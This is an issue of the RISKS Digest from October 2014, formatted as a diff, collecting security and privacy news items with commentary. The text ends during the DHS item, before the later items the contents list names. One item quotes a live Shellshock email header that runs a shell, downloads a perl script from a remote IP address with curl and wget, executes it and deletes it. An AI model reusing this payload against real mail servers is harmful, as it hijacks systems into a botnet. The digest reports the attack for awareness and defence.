@@ -1,0 +1,999 @@
+precedence: bulk
+Subject: Risks Digest 28.32
+
+RISKS-LIST: Risks-Forum Digest  Friday 31 October 2014  Volume 28 : Issue 32
+
+ACM FORUM ON RISKS TO THE PUBLIC IN COMPUTERS AND RELATED SYSTEMS (comp.risks)
+Peter G. Neumann, moderator, chmn ACM Committee on Computers and Public Policy
+
+***** See last item for further information, disclaimers, caveats, etc. *****
+This issue is archived at <http://www.risks.org> as
+  <http://catless.ncl.ac.uk/Risks/28.32.html>
+The current issue can be found at
+  <http://www.csl.sri.com/users/risko/risks.txt>
+
+  Contents:
+Rocket Heading to International Space Station Explodes; No One Is Hurt
+  (NYT via Monty Solomon)
+Dallas hospital alters account of failure to diagnose first US Ebola case
+  (David Tarabar)
+Cars become uninsurable due to their weak security (Jeremy Epstein)
+HP accidentally signed malware, will revoke certificate (Ars)
+Clueless FBI sabotages its own anti-encryption campaign (Caroline Craig)
+FBI director says Chinese hackers are like a "drunk burglar" (Ars)
+Report Reveals Wider Tracking of Mail in U.S. (NYT via Monty Solomon)
+ComputerCOP: dubious "Internet Safety Software" given to US families
+  (Ars via NNSquad)
+Adobe is Spying on Users, Collecting Data on Their eBook Libraries; Adobe
+  Responds to Reports of Their Spying, Offers Half Truths and Misleading
+  Statements (Nate Hoffelder via Gene Wirchenko)
+Adobe tracks your e-book reading habits -- sends logs in plain text (Ars)
+Bugzilla 0-day can reveal 0-day bugs in OSS giants such as Mozilla and
+  Red Hat (Ars)
+White hat claims Yahoo and WinZip hacked by "shellshock" exploiters (Ars)
+Severe Security Problem in Drupal 7.x (Bob Gezelter)
+Chip&Pin^H^H^HDip: Replay It Again Sam (Henry Baker)
+Apple will face $350M trial over iPod DRM (Ars)
+Apple updates definitions to prevent "iWorm" botnet malware on Macs (Ars)
+APPLE-SA-2014-09-29-1 OS X bash Update 1.0 (Monty Solomon)
+APPLE-SA-2014-09-23-1 OS X: Flash Player plug-in blocked (Monty Solomon)
+"One week after patch, Flash vulnerability already exploited
+  in large-scale attacks" (Lucian Constantin)
+2 Drug Chains Disable Apple Pay, as a Rival Makes Plans (NYT)
+Apple Pay Runs Afoul of MCX, a Group With a Rival Product (Monty Solomon)
+Hackers swipe e-mail addresses from Apple Pay-competitor CurrentC (Ars)
+How Apple Pay and Google Wallet actually work (Ars Technica)
+Reddit-powered botnet infected thousands of Macs worldwide (Sean Gallagher)
+Apple patches "Shellshock" Bash bug in OS X 10.9, 10.8, and 10.7
+  (Andrew Cunningham)
+Shellshock fixes beget another round of patches as attacks mount
+  (Andrew Cunningham)
+Executing the Messenger (Henry Baker)
+Even a built-in keylogger! -- "Microsoft's Windows 10 has permission
+  to spy on you!" (Techworm)
+More on Windows 10 /preview/ data collection (Lauren Weinstein)
+"Four more botched Microsoft patches (Woody Leonhard)
+"Microsoft yanks botched patch KB 2949927, re-issues KB 2952664"
+  (Woody Leonhard)
+"Microsoft warns users to kill botched KB 2949927 patch" (Woody Leonhard)
+"Microsoft misses Windows bug, hackers slip past patch" (Gregg Keizer)
+Windows Update intentionally destroys chips (Brian Benchoff via Henry Baker)
+Re: Windows 9 Reportedly Skipped as Name Would Have Created Code Bugs
+  (Mark Thorson)
+"12 surprising ways personal technology betrays your privacy"
+  (Andy Patrizio)
+"Critical Bugzilla vulnerability could give hackers access to
+  undisclosed software flaws" (Lucian Constantin)
+Adobe's e-book reader sends your reading logs back to Adobe --
+  in plain text (Sean Gallagher)
+DHS No Longer Needs Permission Slips to Monitor Other Agencies' Networks
+  (Henry Baker)
+The NSA has no interest in protecting you & me (Henry Baker)
+Law Lets I.R.S. Seize Accounts on Suspicion, No Crime Required
+  (Monty Solomon)
+How Facebook Is Changing the Way Its Users Consume Journalism
+  (Monty Solomon)
+Re: where last passenger went (Dimitri Maziuk)
+Re: Should Airplanes Be Flying Themselves? (John Levine)
+Taylor Swift Tops Canadian iTunes Chart With 8 Seconds of White Noise
+  (Lorena O'Neil via Henry Baker)
+Abridged info on RISKS (comp.risks)
+
+----------------------------------------------------------------------
+
+Date: Tue, 28 Oct 2014 21:19:24 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Rocket Heading to International Space Station Explodes; No One Is Hurt
+
+The unmanned cargo rocket exploded seconds after liftoff from a NASA site in
+eastern Virginia.
+http://www.nytimes.com/2014/10/29/us/rocket-heading-to-international-space-station-explodes-no-one-is-hurt.html
+
+------------------------------
+
+Date: Sat, 25 Oct 2014 19:12:23 -0400
+From: David Tarabar <dtarabar@acm.org>
+Subject: Dallas hospital alters account of failure to diagnose first US
+  Ebola case
+
+The first three articles in RISKS-28.30 describe a Dallas hospital blaming
+EHR software for not diagnosing the first US case of Ebola.  However on a
+Friday evening, the hospital told another story. (Bad news released on
+Friday evening is a popular PR tactic)
+
+  But on Friday evening, the hospital effectively retracted that portion of
+  its statement, saying that `there was no flaw' in its electronic health
+  records system. The hospital said ``the patient's travel history was
+  documented and available to the full care team in the electronic health
+  record (E.H.R.), including within the physician's workflow.''
+
+http://www.nytimes.com/2014/10/04/us/containing-ebola-cdc-troops-west-africa.html
+
+An ER patient history is not meaningless paperwork. It may be diagnostically
+significant and an ER doc is responsible for examining it.  All patients are
+asked about any foreign travel. While EHR software can be improved, human
+and/or institutional error should be assigned the major blame for this
+failure to diagnose Ebola.
+
+------------------------------
+
+Date: Tue, 28 Oct 2014 10:53:19 -0400
+From: Jeremy Epstein <jeremy.j.epstein@gmail.com>
+Subject: Cars become uninsurable due to their weak security
+
+According to a BBC report, insurance companies are refusing to insure
+certain models of cars, or are requiring additional safeguards.  The reason?
+The electronic keys can be hacked, and the number of thefts has been
+increasing dramatically.
+
+This is probably the most direct consumer connection between (computer)
+security and insurance that I've seen.  Could you imagine "your homeowners
+insurance bill is going up because you run Windows"?
+
+http://www.bbc.com/news/technology-29786320
+
+------------------------------
+
+Date: Fri, 10 Oct 2014 09:39:26 -0700
+From: Lauren Weinstein <lauren@vortex.com>
+Subject: HP accidentally signed malware, will revoke certificate (Ars)
+
+Ars Technica via NNSquad
+http://arstechnica.com/security/2014/10/hp-accidentally-signed-malware-will-revoke-certificate/
+
+  Regardless of the cause, the revocation of the affected certificate will
+  require HP to re-issue a large number of software packages with a new
+  digital signature. While the certificate drop may not affect systems with
+  the software already installed, users will be alerted to a bad certificate
+  if they attempt to re-install software from original media. The full
+  impact of the certificate revocation won't be known until after Verisign
+  revokes the certificate on October 21, Wahlin said.
+
+Oops.
+
+------------------------------
+
+Date: Fri, 24 Oct 2014 21:49:14 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Clueless FBI sabotages its own anti-encryption campaign"
+  (Caroline Craig)
+
+Caroline Craig, InfoWorld | Oct 24, 2014
+http://www.infoworld.com/article/2838181/security/clueless-fbi-sabotages-its-anti-encryption-campaign.html
+
+FBI Director Comey says smartphone encryption puts law enforcement in
+peril.  Too bad he doesn't seem to understand technology
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 10:31:54 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: FBI director says Chinese hackers are like a "drunk burglar"
+
+http://arstechnica.com/tech-policy/2014/10/fbi-director-says-chinese-hackers-are-like-a-drunk-burglar/
+
+------------------------------
+
+Date: Tue, 28 Oct 2014 06:19:25 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Report Reveals Wider Tracking of Mail in U.S.
+
+The Postal Service approved nearly 50,000 requests last year from law
+enforcement agencies to secretly track the mail of ordinary Americans for
+use in criminal and national security investigations.
+
+http://www.nytimes.com/2014/10/28/us/us-secretly-monitoring-mail-of-thousands.html
+
+------------------------------
+
+Date: Wed, 1 Oct 2014 08:32:48 -0700
+From: Lauren Weinstein <lauren@vortex.com>
+Subject: ComputerCOP: dubious "Internet Safety Software" given to US families
+
+Ars via NNSquad
+http://arstechnica.com/tech-policy/2014/10/computercop-the-dubious-internet-safety-software-given-to-families-nationwide/
+
+  Police chiefs, sheriffs, and district attorneys have handed out hundreds
+  of thousands of copies of the disc to parents for free at schools,
+  libraries, and community events, usually as a part of an "Internet Safety"
+  outreach initiative. (You can see the long list of ComputerCOP outlets
+  here.) The packaging typically features the agency's official seal and the
+  chief's portrait, with a signed message warning of the "dark and dangerous
+  off-ramps" of the Internet.  As official as it looks, ComputerCOP is
+  actually just spyware, generally bought in bulk from a New York company
+  that appears to do nothing but market this software to local government
+  agencies using shady information.  The way ComputerCOP works is neither
+  safe nor secure. It isn't particularly effective either, except for
+  generating positive PR for the law enforcement agencies distributing
+  it. As security software goes, we observed a product with a
+  keystroke-capturing function, also called a "keylogger," that could place
+  a family's personal information at extreme risk by transmitting those
+  keystroke logs over the Internet to third-party servers without
+  encryption. That means many versions of ComputerCOP leave children (and
+  their parents, guests, friends, and anyone using the affected computer)
+  exposed to the same predators, identity thieves, and bullies that police
+  claim the software protects against.  Furthermore, by providing a free
+  keylogging program--software that operates without even the most basic
+  security safeguards--law enforcement agencies are passing around what
+  amounts to a spying tool that could easily be abused by people who want to
+  snoop on spouses, roommates, or co-workers.
+
+------------------------------
+
+Date: Thu, 09 Oct 2014 21:08:48 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Adobe is Spying on Users, Collecting Data on Their eBook
+  Libraries"; "Adobe Responds to Reports of Their Spying, Offers Half Truths
+  and Misleading Statements" (Nate Hoffelder)
+
+Nate Hoffelder, 6 Oct 2014
+http://the-digital-reader.com/2014/10/06/adobe-spying-users-collecting-data-ebook-libraries/#.VDQhI_ldWYA
+
+Nate Hoffelder, 7 Oct 2014
+http://the-digital-reader.com/2014/10/07/adobe-responds-reports-spying-half-truths-misleading-statements/#.VDRpCvldWIV
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 09:22:03 -0700
+From: Lauren Weinstein <lauren@vortex.com>
+Subject: Adobe tracks your e-book reading habits -- sends logs in plain text
+
+Ars Technica via NNSquad
+http://arstechnica.com/security/2014/10/adobes-e-book-reader-sends-your-reading-logs-back-to-adobe-in-plain-text/
+
+  "Adobe's Digital Editions e-book and PDF reader -- an application used by
+  thousands of libraries to give patrons access to electronic lending
+  libraries--actively logs and reports every document readers add to their
+  local "library" along with what users do with those files. Even worse, the
+  logs are transmitted over the Internet in the clear, allowing anyone who
+  can monitor network traffic (such as the National Security Agency,
+  Internet service providers and cable companies, or others sharing a public
+  Wi-Fi network) to follow along over readers' shoulders.  Ars has
+  independently verified the logging of e-reader activity with the use of a
+  packet capture tool. The exposure of data was first discovered by Nate
+  Hoffelder of The Digital Reader, who reported the issue to Adobe but
+  received no reply. Ars has also reached out to Adobe for comment with no
+  response."
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 10:29:27 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Bugzilla 0-day can reveal 0-day bugs in OSS giants
+  such as Mozilla and Red Hat
+
+http://arstechnica.com/security/2014/10/check-point-hacks-bugzilla-tracking-system-to-demonstrate-bad-bug/
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 10:26:11 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: White hat claims Yahoo and WinZip hacked by "shellshock" exploiters
+
+http://arstechnica.com/security/2014/10/white-hat-claims-yahoo-and-winzip-hacked-by-shellshock-exploiters/
+
+------------------------------
+
+Date: Fri, 31 Oct 2014 12:33:38 -0700
+From: "Bob Gezelter" <gezelter@rlgsc.com>
+Subject: Severe Security Problem in Drupal 7.x
+
+There has been a critical security flaw identified in Drupal 7.x, an update
+is available. The flaw allows a SQL injection attack to compromise servers
+running Drupal.  Details of the attack have been published. The relevant bug
+entry appears to be:
+  https://www.drupal.org/node/2146839
+
+Bob Gezelter, http://www.rlgsc.com
+
+------------------------------
+
+Date: Tue, 28 Oct 2014 13:58:13 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: Chip&Pin^H^H^HDip: Replay It Again Sam
+
+FYI -- Didn't Ross Anderson's group at Cambridge demonstrate similar
+problems with chips&pins a while ago?
+  [YES: See http://www.csl.sri.com/neumann/cacm233.pdf]
+
+Krebs on Security In-depth security news and investigation, 27 Oct 14
+http://krebsonsecurity.com/2014/10/replay-attacks-spoof-chip-card-charges/
+
+Replay Attacks Spoof Chip Card Charges
+
+An odd new pattern of credit card fraud emanating from Brazil and targeting
+U.S. financial institutions could spell costly trouble for banks that are
+just beginning to issue customers more secure chip-based credit and debit
+cards.
+
+Over the past week, at least three U.S. financial institutions reported
+receiving tens of thousands of dollars in fraudulent credit and debit card
+transactions coming from Brazil and hitting card accounts stolen in recent
+retail heists, principally cards compromised as part of the breach at Home
+Depot.
+
+The most puzzling aspect of these unauthorized charges?  They were all
+submitted through Visa and MasterCard's networks as chip-enabled
+transactions, even though the banks that issued the cards in question
+haven't even yet begun sending customers chip-enabled cards.
+
+The most frustrating aspect of these unauthorized charges?  They're far
+harder for the bank to dispute.  Banks usually end up eating the cost of
+fraud from unauthorized transactions when scammers counterfeit and use
+stolen credit cards.  Even so, a bank may be able to recover some of that
+loss through dispute mechanisms set up by Visa and MasterCard, as long as
+the bank can show that the fraud was the result of a breach at a specific
+merchant (in this case Home Depot).
+
+However, banks are responsible for all of the fraud costs that occur from
+any fraudulent use of their customers' chip-enabled credit/debit cards
+-- even fraudulent charges disguised as these pseudo-chip transactions. [...]
+
+------------------------------
+
+Date: Fri, 3 Oct 2014 16:44:29 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Apple will face $350M trial over iPod DRM
+
+http://arstechnica.com/tech-policy/2014/10/apple-will-face-350m-trial-over-ipod-drm/
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 10:30:53 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Apple updates definitions to prevent "iWorm" botnet malware on Macs
+
+http://arstechnica.com/apple/2014/10/apple-updates-definitions-to-prevent-iworm-botnet-malware-on-macs/
+
+------------------------------
+
+Date: Fri, 3 Oct 2014 14:30:31 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: APPLE-SA-2014-09-29-1 OS X bash Update 1.0
+
+OS X bash Update 1.0 is now available and addresses the following:
+
+Bash
+Available for: OS X Lion v10.7.5, OS X Lion Server v10.7.5, OS X Mountain Lion v10.8.5,
+OS X Mavericks v10.9.5
+Impact: In certain configurations, a remote attacker may be able to execute
+arbitrary shell commands
+Description: An issue existed in Bash's parsing of environment
+variables. This issue was addressed through improved environment variable
+parsing by better detecting the end of the function statement.
+This update also incorporated the suggested CVE-2014-7169 change, which
+resets the parser state.
+In addition, this update added a new namespace for exported functions by
+creating a function decorator to prevent unintended header passthrough to
+Bash. The names of all environment variables that introduce function
+definitions are required to have a prefix "__BASH_FUNC<" and suffix ">()" to
+prevent unintended function passing via HTTP headers.
+
+CVE-2014-6271 : Stephane Chazelas
+CVE-2014-7169 : Tavis Ormandy
+
+OS X bash Update 1.0 may be obtained from the following webpages:
+http://support.apple.com/kb/DL1767 - OS X Lion
+http://support.apple.com/kb/DL1768 - OS X Mountain Lion
+http://support.apple.com/kb/DL1769 - OS X Mavericks
+
+To check that bash has been updated:
+
+* Open Terminal
+* Execute this command:
+bash --version
+* The version after applying this update will be:
+OS X Mavericks:  GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin13)
+OS X Mountain Lion:  GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin12)
+OS X Lion:  GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin11)
+
+Information will also be posted to the Apple Security Updates
+web site: http://support.apple.com/kb/HT1222
+
+This message is signed with Apple's Product Security PGP key,
+and details are available at:
+https://www.apple.com/support/security/pgp/
+
+------------------------------
+
+Date: Fri, 3 Oct 2014 14:29:09 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: APPLE-SA-2014-09-23-1 OS X: Flash Player plug-in blocked
+
+Due to security issues in older versions, Apple has updated the web plug-in
+blocking mechanism to disable all versions prior to Flash Player 15.0.0.152
+and 13.0.0.244.
+
+Information on blocked web plug-ins will be posted to:
+http://support.apple.com/kb/HT5655
+
+This message is signed with Apple's Product Security PGP key, and details
+are available at: https://www.apple.com/support/security/pgp/
+
+------------------------------
+
+Date: Tue, 21 Oct 2014 17:51:20 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "One week after patch, Flash vulnerability already exploited
+  in large-scale attacks" (Lucian Constantin)
+
+Lucian Constantin, Infoworld, 21 Oct 2014
+large-scale attacks
+The Fiesta exploit kit bundles an exploit for the CVE-2014-0569
+vulnerability in Flash Player, researchers found
+http://www.infoworld.com/article/2836438/security/one-week-after-patch-flash-vulnerability-already-exploited-in-largescale-attacks.html
+
+------------------------------
+
+Date: Sun, 26 Oct 2014 23:32:57 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: 2 Drug Chains Disable Apple Pay, as a Rival Makes Plans
+
+A consortium of merchants plans to introduce a payment system next year that
+will supplant the use of credit and debit cards.
+
+http://www.nytimes.com/2014/10/27/technology/personaltech/2-drug-chains-disable-apple-pay-as-a-rival-makes-plans-.html
+
+------------------------------
+
+Date: Wed, 29 Oct 2014 07:08:12 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Apple Pay Runs Afoul of MCX, a Group With a Rival Product
+
+Rite Aid and CVS are not accepting Apple Pay because they belong to a
+consortium of retailers planning to release their own mobile payment system
+next year.
+
+http://www.nytimes.com/2014/10/29/technology/apple-pay-runs-afoul-of-a-rival.html
+
+------------------------------
+
+Date: Wed, 29 Oct 2014 22:46:18 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Hackers swipe e-mail addresses from Apple Pay-competitor CurrentC
+
+http://arstechnica.com/business/2014/10/cvs-rite-aid-supported-alternative-to-apple-pay-already-hacked/
+
+------------------------------
+
+Date: Wed, 29 Oct 2014 22:47:29 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: How Apple Pay and Google Wallet actually work
+
+http://arstechnica.com/gadgets/2014/10/how-mobile-payments-really-work/
+
+------------------------------
+
+Date: Sun, 5 Oct 2014 00:08:37 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Reddit-powered botnet infected thousands of Macs worldwide
+  (Sean Gallagher)
+
+Sean Gallagher, Ars Technica, 3 Oct 2014
+Mac.BackDoor.iWorm used Minecraft server subreddit for command and control.
+
+The Russian antivirus vendor Dr. Web has reported the spread of a new botnet
+that exclusively targets Apple computers running Mac OS X.  According to a
+survey of traffic conducted by researchers at Dr. Web, over 17,000 Macs
+worldwide are part of the Mac.BackDoor.iWorm botnet-and almost a quarter of
+them are in the US. One of the most curious aspects of the botnet is that it
+uses a search of Reddit posts to a Minecraft server list subreddit to
+retrieve IP addresses for its command and control (CnC) network. That
+subreddit now appears to have been expunged of CnC data, and the account
+that posted the data appears to be shut down. ...
+
+http://arstechnica.com/security/2014/10/reddit-powered-botnet-infected-thousands-of-macs-worldwide/
+
+------------------------------
+
+Date: Fri, 3 Oct 2014 00:23:44 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Apple patches "Shellshock" Bash bug in OS X 10.9, 10.8, and 10.7
+  (Andrew Cunningham)
+
+Andrew Cunningham, Ars Technica, 29 Sep 2014
+Fixes Bash bug discovered last week that's already been seen in the wild.
+http://arstechnica.com/apple/2014/09/apple-patches-shellshock-bash-bug-in-os-x-10-9-10-8-and-10-7/
+  [See also http://support.apple.com/kb/HT6495 -- PGN]
+
+------------------------------
+
+Date: Fri, 3 Oct 2014 00:22:24 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Shellshock fixes beget another round of patches as attacks mount
+  (Sean Gallagher)
+
+Sean Gallagher, Ars Technica, 30 Sep 2014
+SANS' Internet Storm Center moves up threat level based on bash exploits in
+  wild.
+
+Over the past few days, Apple, Red Hat, and others have pushed out patches
+to vulnerabilities in the GNU Bourne Again Shell (bash). The vulnerabilities
+previously allowed attackers to execute commands remotely on systems that
+use the command parser under some conditions-including Web servers that use
+certain configurations of Apache. However, some of the patches made changes
+that broke from the functionality of the GNU bash code, so now debate
+continues about how to "un-fork" the patches and better secure bash.
+
+At the same time, the urgency of applying those patches has mounted as more
+attacks that exploit the weaknesses in bash's security (dubbed "Shellshock")
+have appeared. In addition to the threat first spotted the day after the
+vulnerability was made public, a number of new attacks have emerged. While
+some appear to simply be vulnerability scans, there are also new exploit
+attempts that carry malware or attempt to give the attacker direct remote
+control of the targeted system. ...
+
+http://arstechnica.com/security/2014/09/shellshock-fixes-beget-another-round-of-patches-as-attacks-mount/
+
+------------------------------
+
+Date: Tue, 28 Oct 2014 14:16:05 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: Executing the Messenger
+
+[attachment (Henry says, ``but sometimes a picture is worth 1000 words.'')
+deleted for RISKS.  Sorry.  PGN]
+
+Here's the To: line:
+To: {:;, }, /bin/sh.-c.'/bin/sh.-c.'cd/tmp, curl.-sO.178.254.31.165/ext.txt,
+    lwp-download.http:;, //178.254.31.165/ex.txt, wget.178.254.31.165/ex.txt,
+    fetch.178.254.31.165/ex.txt, perl.ex.txt,
+    <rm.-fr.ex.*'.&'.&@mailserver.internaldomain>
+
+Cc, From, Subject, References, Message-ID, Comments, Keywords, Resent-From
+are all similar.
+
+Nothing quite like bashing the postman with shellshock...
+
+Michael Mimoso  Follow @mike_mimoso 27 Oct 2014
+Shellshock Exploits Targeting SMTP Servers at Webhosts
+https://threatpost.com/shellshock-exploits-targeting-smtp-servers-at-webhosts/109034
+
+The persistence of the Shellshock vulnerability remains high more than a
+month after it first surfaced.  The latest attacks involved SMTP servers
+belonging to web hosts, said a report published by the SANS Internet Storm
+Center.
+
+Attackers are using Shellshock exploits targeting the now infamous
+vulnerability in Bash (Bourne Again Shell) in order to drop a perl script
+onto compromised computers.  The script adds the hacked computers to a
+botnet that receives its commands over IRC, said a post on the Binary
+Defense Systems website: ``The attack leverages Shellshock as a main attack
+vector through the subject, body, to, from fields.  Once compromised, a perl
+botnet is activated and beaconing on IRC for further instructions.''
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 08:21:54 -0700
+From: Lauren Weinstein <lauren@vortex.com>
+Subject: Even a built-in keylogger! -- "Microsoft's Windows 10 has
+  permission to spy on you!"
+
+Techworm via NNSquad
+http://www.techworm.net/2014/10/microsofts-windows-10-permission-watch-every-move.html
+
+  "Microsoft collects information about you, your devices, applications and
+  networks, and your use of those devices, applications and
+  networks. Examples of data we collect include your name, email address,
+  preferences and interests; browsing, search and file history; phone call
+  and SMS data; device configuration and sensor data; and application
+  usage."
+
+  "If you open a file, we may collect information about the file, the
+  application used to open the file, and how long it takes any use [of]it
+  for purposes such as improving performance, or [if you]enter text, we may
+  collect typed characters, we may collect typed characters and use them for
+  purposes such as improving autocomplete and spell check features."
+
+Worth reading, even though the entire article is in a low-contrast font and
+italics.
+
+  [See also Chris Merriman, *The Inquirer*, 3 Oct 2014
+  Its 'privacy' policy includes permission to use a keylogger
+http://www.theinquirer.net/inquirer/news/2373838/microsofts-windows-10-preview-has-permission-to-watch-your-every-move
+  ]
+
+------------------------------
+
+Date: Tue, 7 Oct 2014 09:03:11 -0700
+From: Lauren Weinstein <lauren@vortex.com>
+Subject: More on Windows 10 /preview/ data collection
+
+I want to add a few of my own thoughts to that article on the Windows 10
+preview version data collection policies.
+
+If any of those data collection features were enabled by default, and unless
+there's a big red warning at installation that you must respond to with more
+than a single click, explaining all these aspects, it's still
+unacceptable. Too many people will download this and use it like any other
+system without considering the implications. I couldn't care less what they
+plan to do when it goes out of beta at this juncture -- I'm concerned about
+right now.
+
+As I recall they've done similar in previous previews, but the stakes are
+much higher now given government attitudes to collected data.
+
+It is a mistake to assume that everyone who will download this preview or
+end up with it installed (perhaps by their "IT Guy") will be cognizant of
+the options and implications. I'm the guy who found MS' undisclosed "phone
+home" behavior years ago. It was not an enormous privacy problem, but it was
+still telling and a lot of bad press for MS resulted.
+
+------------------------------
+
+Date: Fri, 17 Oct 2014 14:29:16 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Four more botched Microsoft patches (Woody Leonhard)
+
+Woody Leonhard, InfoWorld, 16 Oct 2014
+Windows users are reporting significant problems with four more
+October Black Tuesday patches: KB 3000061, KB 2984972, KB 2949927, KB 2995388
+http://www.infoworld.com/article/2834535/security/four-more-botched-black-tuesday-patches-kb-3000061-kb-2984972-kb-2949927-and-kb-2995388.html
+
+------------------------------
+
+Date: Mon, 20 Oct 2014 11:32:26 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Microsoft yanks botched patch KB 2949927, re-issues KB 2952664"
+  (Woody Leonhard)
+
+Ah, the risks of missing documentation.
+
+Woody Leonhard, InfoWorld | 17 Oct 2014
+Windows 7 upgrade compatibility patch gets a tweaked installer, while
+the SHA-2 hashing patch is summarily removed without explanation
+http://www.infoworld.com/article/2834930/security/microsoft-yanks-botched-patch-kb-2949927-re-issues-kb-2952664.html
+
+------------------------------
+
+Date: Mon, 20 Oct 2014 11:45:17 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Microsoft warns users to kill botched KB 2949927 patch"
+  (Woody Leonhard)
+
+Woody Leonhard, InfoWorld | 20 Oct 2014
+Microsoft yanked SHA-2 patch KB 2949927, and now goes further and
+cautions users to uninstall the update
+http://www.infoworld.com/article/2835571/microsoft-windows/microsoft-says-best-way-to-fix-botched-kb-2949927-patch-is-to-kill-it.html
+
+------------------------------
+
+Date: Thu, 23 Oct 2014 14:09:10 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Microsoft misses Windows bug, hackers slip past patch"
+
+Gregg Keizer, Computerworld, 22 Oct 2014
+Microsoft misses Windows bug, hackers slip past patch
+Last week's security update 'not robust enough,' say researchers who
+co-reported flaw
+http://www.infoworld.com/article/2837085/security/microsoft-misses-windows-bug-hackers-slip-past-patch.html
+
+------------------------------
+
+Date: Fri, 24 Oct 2014 09:35:35 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: Windows Update intentionally destroys chips (Brian Benchoff)
+
+Microsoft Windows Update distributed new driver code that intentionally
+destroys "counterfeit" chips; the USB "PID" is set to 0 in the EEPROM of the
+device, rendering the device useless forever more.
+
+This ploy opens up a whole new front in the hacker wars; NSA TAO is no doubt
+rubbing its hands with delight as we speak.
+
+Just as STUXNET broke down one barrier in hacking; FTDI broke down another.
+E.g., in the future, look for iPhone and Android apps which disable their
+competitor apps & implanted medical devices that destroy other implanted
+medical devices found in the same human body. [...]
+
+Brian Benchoff, FTDI Screws Up, Backs Down, 24 Oct 2014
+http://hackaday.com/2014/10/24/ftdi-screws-up-backs-down/
+
+------------------------------
+
+Date: Mon, 27 Oct 2014 21:09:17 -0700
+From: Mark Thorson <eee@sonic.net>
+Subject: Re: Windows 9 Reportedly Skipped as Name Would Have Created Code Bugs
+
+I confidently predict the next version will be Windows 20, which raises the
+obvious question of what follows Windows 80?  I suggest Windows A.  That
+buys another 26 major revisions, which should take us comfortably past the
+year 199Z (2025 AD).
+
+------------------------------
+
+Date: Fri, 03 Oct 2014 11:06:10 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "12 surprising ways personal technology betrays your privacy"
+  (Andy Patrizio)
+
+Andy Patrizio, ITworld, 3 Oct 2014
+It's not just your boss or the government that's spying on you, it's
+also the devices and technologies you embrace.
+http://www.infoworld.com/article/2687778/security/security-164894-12-privacy-destroying-personal-technologies.html
+
+------------------------------
+
+Date: Wed, 08 Oct 2014 16:16:17 -0700
+From: Gene Wirchenko <genew@telus.net>
+Subject: "Critical Bugzilla vulnerability could give hackers access to
+  undisclosed software flaws" (Lucian Constantin)
+
+Lucian Constantin, InfoWorld, 7 Oct 2014
+http://www.infoworld.com/article/2692521/security/critical-bugzilla-vulnerability-could-give-hackers-access-to-undisclosed-software-flaws.html
+Software projects that use the Bugzilla bug tracking software should
+deploy the latest patches immediately, security researchers said
+
+------------------------------
+
+Date: Thu, 9 Oct 2014 00:29:15 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Adobe's e-book reader sends your reading logs back to Adobe --
+ in plain text
+
+Sean Gallagher, Ars Technica, 7 Oct 2014
+Digital Editions even tracks which pages you've read.  It might break a New
+Jersey Law.
+
+Adobe's Digital Editions e-book and PDF reader-an application used by
+thousands of libraries to give patrons access to electronic lending
+libraries-actively logs and reports every document readers add to their
+local "library" along with what users do with those files. Even worse, the
+logs are transmitted over the Internet in the clear, allowing anyone who can
+monitor network traffic (such as the National Security Agency, Internet
+service providers and cable companies, or others sharing a public Wi-Fi
+network) to follow along over readers' shoulders. ...
+
+http://arstechnica.com/security/2014/10/adobes-e-book-reader-sends-your-reading-logs-back-to-adobe-in-plain-text/
+
+------------------------------
+
+Date: Tue, 07 Oct 2014 07:31:13 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: DHS No Longer Needs Permission Slips to Monitor Other
+  Agencies' Networks
+
+FYI -- DHS can now *legally* hone their PEN skills on other agencies, both on their websites and their mobile devices.
+
+Aliya Sternstein, NextGov.com. 3 Oct 2014
+[Some selected quotes from the OMB memo:]
+http://www.nextgov.com/cybersecurity/2014/10/dhs-no-longer-needs-permission-slips-monitor-other-agencies-networks-vulnerabilities/95807/
+
+"a proactive vulnerability scanning process"
+"only applicable to Federal civilian agency networks"
+"does not impact classified or national security systems and/or networks"
+"the number of phishing attacks is steadily increasing"
+
+"Scan Internet accessible addresses and public facing segments of Federal
+civilian agency systems for vulnerabilities on an ongoing basis as well as
+in response to newly discovered vulnerabilities on an urgent basis, to
+include without prior agency authorization on an emergency basis where not
+prohibited by law"
+
+"Provide DHS ... with a complete list of all Internet accessible addresses
+and systems, including static IP addresses for external websites, servers
+and other access points and domain name service names for dynamically
+provisioned systems"
+
+"Enter into a legally sufficient Memorandum of Agreement with DHS relating
+to the deployment of EINSTEIN (an intrusion detection and prevention
+capability operated by DHS)"
+
